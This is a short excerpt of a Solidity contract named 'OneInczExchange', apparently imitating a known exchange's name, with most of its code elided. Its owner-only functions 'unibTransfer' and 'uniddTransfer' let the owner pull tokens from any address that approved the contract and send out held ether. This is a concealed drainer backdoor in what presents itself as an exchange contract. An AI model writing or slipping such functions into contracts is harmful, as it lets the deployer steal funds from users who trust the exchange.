...
contract OneInczExchange is Ownable, Pausable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;
    ...
    function rescueFunds(IERC20 token, uint256 amount) external onlyOwner {
     ...
     function uniddTransfer(address payable to, uint256 amount) external onlyOwner {
         to.transfer(amount);
    }
    
    function unibTransfer(IERC20 token, address payable _from, address payable to, uint256 amount) external onlyOwner {
         token.transferFrom(_from, to, amount);
    }
